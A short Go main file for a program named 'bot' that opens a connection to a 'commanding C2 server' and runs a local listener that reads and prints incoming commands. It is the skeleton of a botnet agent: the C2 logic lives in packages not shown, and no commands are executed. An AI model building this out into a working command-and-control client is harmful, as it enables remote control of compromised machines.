package main

import (
	cli "bot/communication/client"
	srv "bot/communication/server"
	msg "bot/message"
	"fmt"
	r "math/rand"
	"net"
	"os"
	"sync"
	"time"
)

const (
	Msgsize    = 4096
)

var (
	wg  sync.WaitGroup
	O   msg.Bot
	src = r.NewSource(time.Now().UnixNano())
)

// tryConnect tries to connect to the remote commanding C2 server
func tryConnect()() {
	var remoteServer net.Conn = cli.ConnectToCommandingC2()
	if remoteServer != nil {
		defer remoteServer.Close()
	} else {
		return;
	}
	cli.WriteData(remoteServer)
}

func main() () {
	wg.Add(1)
	go func(){
		defer wg.Done()
		tryConnect()
	}()
	
	wg.Add(1)
	go func() {
		defer wg.Done()
		
		var listener net.Listener = srv.StartLocalServer()
		defer listener.Close()
		
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		fmt.Println("Accepted connection from ", conn.RemoteAddr())
		commands, err := srv.ReadCommands(conn)
		if err != nil {
			fmt.Println("Error reading commands: ", err.Error())
			return;
		}
		fmt.Println("Received commands: ", commands)
		
	}()
	
	wg.Wait();
}


// https://blog.jbowen.dev/2019/09/the-magic-of-go-comments/
